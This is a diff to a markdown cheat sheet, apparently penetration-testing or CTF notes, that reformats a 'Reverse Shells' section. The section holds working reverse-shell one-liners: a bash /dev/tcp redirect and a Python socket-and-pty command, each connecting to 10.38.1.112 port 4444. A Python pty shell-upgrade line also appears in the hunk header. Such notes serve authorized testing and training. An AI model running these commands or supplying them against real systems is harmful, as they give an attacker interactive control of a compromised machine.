@@ -9,11 +9,15 @@ $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ## Reverse Shells
 
-```console
-#Bash
-bash -i >& /dev/tcp/10.38.1.112/4444 0>&1
+### Bash
 
-#Python
+```console
+bash -i >& /dev/tcp/10.38.1.112/4444 0>&1
+```
+
+### Python
+
+´´´console
 python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.38.1.112",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
 
